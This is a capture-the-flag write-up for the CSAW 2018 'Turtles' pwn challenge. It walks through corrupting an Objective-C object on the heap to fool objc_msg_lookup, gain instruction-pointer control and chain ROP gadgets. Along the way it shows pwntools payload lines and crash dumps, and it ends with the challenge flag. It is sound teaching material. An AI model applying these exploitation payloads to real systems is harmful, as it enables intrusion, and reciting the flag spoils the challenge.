---
title: Turtles - CSAW Quals 2018
date: '2018-09-18 14:49:32'
layout: post
---

> Looks like you found a bunch of turtles but their shells are nowhere to be seen! Think you can make a shell for them?
>
> nc pwn.chal.csaw.io 9003
>
> Update (09/14 6:25 PM) - Added libs.zip with the libraries for the challenge
>
> [tutles](https://github.com/vakzz/ctfs/raw/master/CSAW18/turtles/turtles) [libc.zip](https://github.com/vakzz/ctfs/raw/master/CSAW18/turtles/libs.zip) 

_250 points, 65 Solves, pwn_

We are given a small binary that when run prints out **Here is a Turtle**  along with what looks like a heap address, then takes some input and segfaults. Looking at the decompiled code we can see that it is objective-c based:

```c
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);

  TurtleClass = objc_get_class("Turtle", 0LL);
  alloc = objc_msg_lookup(TurtleClass, allocSelector);
  turtleMem = alloc(TurtleClass, allocSelector);

  init = objc_msg_lookup(turtleMem, initSelector);
  turtle = init(turtleMem, initSelector);

  printf("Here is a Turtle: %p\n", turtle, argv);
  read(0, buf, 2064uLL);
  memcpy(turtle, buf, 0xC8uLL);

  say = objc_msg_lookup(turtle, saySelector);
  say(turtle, saySelector, &aIAmATurtle_NString);

  release = objc_msg_lookup(turtle, releaseSelector);
  release(turtle, releaseSelector);
```

A `Tutrle` is first initialzed and we are given its heap address, then 2064 bytes are read into a stack buffer, and the the first 200 of them are used to overwrite our tutle object. Finally the the say method on our turtle is called.

I started off by just sending a payload of `cyclic(200)` to see what would happen, and we end up segfaulting with:
```javascript
 $rbp   : 0x6161616261616161 ("aaaabaaa"?)
 0x7fc46ff0bbf9 <objc_msg_lookup+25> mov    rdx, QWORD PTR [rbp+0x40]
```

As we are given the heap adress, we can set this to a known location to try continue on. Setting it to the address of our turtle produces this segfault:

```javascript
 $rcx   : 0xc95
 $rdx   : 0x616161706161616f ("oaaapaaa"?)
 0x7f0259eb8c0c <objc_msg_lookup+44> cmp    rcx, QWORD PTR [rdx+0x28]
```

All of this is controlable still, so what happens if we fix up `[rdx+0x28]` to point to something less than `0xc95`?

```python
 p.sendline(p64(turtle) + cyclic(56) + p64(turtle + 32) + p64(1))
```
```javascript
 $rax   : 0x6161616a61616169 ("iaaajaaa"?)
 0x7fe32c500c16 <objc_msg_lookup+54> mov    rax, QWORD PTR [rax]
```

So far so good. If we fix up this final segfault we end up with rip control!
```python
  p.sendline(p64(turtle) + "A"*32 + p64(turtle + 80) + "B"*16 + p64(turtle + 32) + p64(1) + p64(0x12345678))
```
![gef-rip](/assets/csaw18/turtles1.jpg)

Also it looks like our payload is not too far away in the stack, so we should be able to find a simple pop4/ret to start a rop chain!

From here it was just a matter of pivoting the stack to the heap so we have a bit more space to work with, and leaking libc. It was a bit tricky as there was no gadget to easily set rdx which got changed to 0 after calling printf, but we did have the option of jumping back to the start of main and repeating everything. This allowed us to read the final rop payload after we had leaked libc.

After solving this, I had a bit more of a look into what was actually happening in `objc_msg_lookup`. From [sendmsg.c#L448](https://github.com/gcc-mirror/gcc/blob/gcc-4_8_5-release/libobjc/sendmsg.c#L448) it looks like we simply tricked the lookup into thinking our payloaded was a valid cached method and so it was returned and used.

`flag{i_like_turtl3$_do_u?}`

Full exploit at [turtles.py](https://github.com/vakzz/ctfs/blob/master/CSAW18/turtles/turtles.py)